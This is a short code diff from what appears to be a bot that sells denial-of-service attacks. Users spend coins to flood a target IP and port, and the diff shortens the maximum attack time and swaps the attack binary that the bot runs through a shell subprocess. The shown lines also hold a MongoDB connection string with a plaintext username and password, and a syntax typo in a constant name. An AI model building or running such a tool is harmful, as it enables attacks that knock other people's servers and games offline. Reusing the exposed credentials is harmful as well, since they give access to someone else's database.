@@ -14,7 +14,7 @@ ADMIN_USER_ID = 5820236233
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "legxninja"
 COLLECTION_NAME = "users"
-ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
+ATTACK_TIME_LIMIT = 120  # Maximum attack duration in seconds
 COINS_REQUIRED_PER)_ATTACK = 5  # Coins required for an attack
 
 # MongoDB setup
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./bgmi {ip} {port} {duration} {13} {600}"
+        command = f"./venompapa {ip} {port} {duration} {900}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
